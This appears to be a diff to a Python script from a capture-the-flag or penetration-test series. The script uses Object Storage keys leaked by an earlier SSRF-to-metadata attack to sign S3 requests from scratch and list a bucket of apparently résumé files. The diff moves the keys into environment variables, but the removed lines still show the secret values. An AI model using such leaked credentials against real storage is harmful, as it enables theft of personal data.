@@ -2,7 +2,8 @@
 
 Approach:
     task18's SSRF->IMDS chain leaked long-lived Yandex Object Storage keys
-    (``ACCESS``/``SECRET`` below) in the backend's ``.env``. Object Storage
+    in the backend's ``.env``. Pass them as ``STORAGE_ACCESS_KEY`` and
+    ``STORAGE_SECRET_KEY``; Object Storage
     speaks plain AWS S3 SigV4, so no SDK is needed: this script implements
     the canonical-request/string-to-sign/signing-key chain from scratch
     (``sign``/``sigkey``/``req``), lists ``medhunter-resumes-6d6c314a`` with
@@ -13,17 +14,20 @@ Approach:
 
 Run::
 
-    uv run task19/s3get.py
+    STORAGE_ACCESS_KEY=... STORAGE_SECRET_KEY=... uv run python task19/s3get.py
 """
 
 import datetime
 import hashlib
 import hmac
+import os
 import urllib.error
 import urllib.request
 
-ACCESS = "YCAJE6hJjOgIlF3PuygPg3FVu"
-SECRET = "YCPNni3w1j_GOTNT_tpBs2CWGxZZxqW1GYsKNw06"
+ACCESS = os.environ.get("STORAGE_ACCESS_KEY")
+SECRET = os.environ.get("STORAGE_SECRET_KEY")
+if not ACCESS or not SECRET:
+    raise SystemExit("set STORAGE_ACCESS_KEY and STORAGE_SECRET_KEY from the task18 leak")
 REGION = "ru-central1"
 HOST = "storage.yandexcloud.net"
 SERVICE = "s3"
